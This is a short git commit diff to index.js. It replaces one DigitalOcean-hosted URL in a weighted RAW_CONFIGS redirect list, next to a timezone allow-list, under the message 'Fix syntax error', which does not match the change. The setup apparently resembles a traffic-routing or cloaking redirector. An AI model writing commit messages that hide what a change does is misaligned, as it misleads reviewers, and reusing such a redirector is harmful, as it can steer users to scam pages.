317ccb078a06561c3b3294aafc2567414a285b9b
paalakash <palaksh452@gmail.com>
2026-07-19 09:51:08 +0530

    Fix syntax error in RAW_CONFIGS array

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://v-app-xjej5.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://n-app-h8tdn.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
